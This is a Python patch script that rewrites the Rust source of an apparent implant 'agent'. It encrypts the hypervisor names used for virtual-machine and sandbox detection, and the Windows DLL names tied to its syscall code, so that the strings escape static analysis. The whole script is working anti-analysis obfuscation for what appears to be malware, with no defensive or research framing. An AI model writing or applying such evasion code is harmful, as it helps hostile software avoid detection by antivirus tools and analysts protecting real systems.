import re

with open("agent/src/env_check.rs", "r") as f:
    c = f.read()

# QEMU
c = c.replace("\"qemu\"", "String::from_utf8_lossy(&string_crypt::enc_str!(\"qemu\")).trim_end_matches('\\0').to_string()")
c = c.replace("\"kvm\"", "String::from_utf8_lossy(&string_crypt::enc_str!(\"kvm\")).trim_end_matches('\\0').to_string()")
c = c.replace("\"vmware\"", "String::from_utf8_lossy(&string_crypt::enc_str!(\"vmware\")).trim_end_matches('\\0').to_string()")
c = c.replace("\"virtualbox\"", "String::from_utf8_lossy(&string_crypt::enc_str!(\"virtualbox\")).trim_end_matches('\\0').to_string()")
c = c.replace("\"xen\"", "String::from_utf8_lossy(&string_crypt::enc_str!(\"xen\")).trim_end_matches('\\0').to_string()")
c = c.replace("\"hyperv\"", "String::from_utf8_lossy(&string_crypt::enc_str!(\"hyperv\")).trim_end_matches('\\0').to_string()")

c = c.replace("const NEEDLES: &[&str] = &", "let needles = vec!")
c = c.replace("NEEDLES.iter().any(|n| s.contains(n))", "needles.iter().any(|n| s.contains(n.as_str()))")
c = c.replace("[\"VBOX\", \"VMWARE\", \"QEMU\", \"XEN\"]", "vec![\"VBOX\".to_string(), \"VMWARE\".to_string(), String::from_utf8_lossy(&string_crypt::enc_str!(\"QEMU\")).trim_end_matches('\\0').to_string(), \"XEN\".to_string()]")

with open("agent/src/env_check.rs", "w") as f:
    f.write(c)

with open("agent/src/syscalls.rs", "r") as f:
    c = f.read()

c = c.replace("\"ntdll.dll\"", "String::from_utf8_lossy(&string_crypt::enc_str!(\"ntdll.dll\")).trim_end_matches('\\0')")
c = c.replace("\"kernelbase.dll\"", "String::from_utf8_lossy(&string_crypt::enc_str!(\"kernelbase.dll\")).trim_end_matches('\\0')")
c = c.replace("\"kernel32.dll\"", "String::from_utf8_lossy(&string_crypt::enc_str!(\"kernel32.dll\")).trim_end_matches('\\0')")

with open("agent/src/syscalls.rs", "w") as f:
    f.write(c)

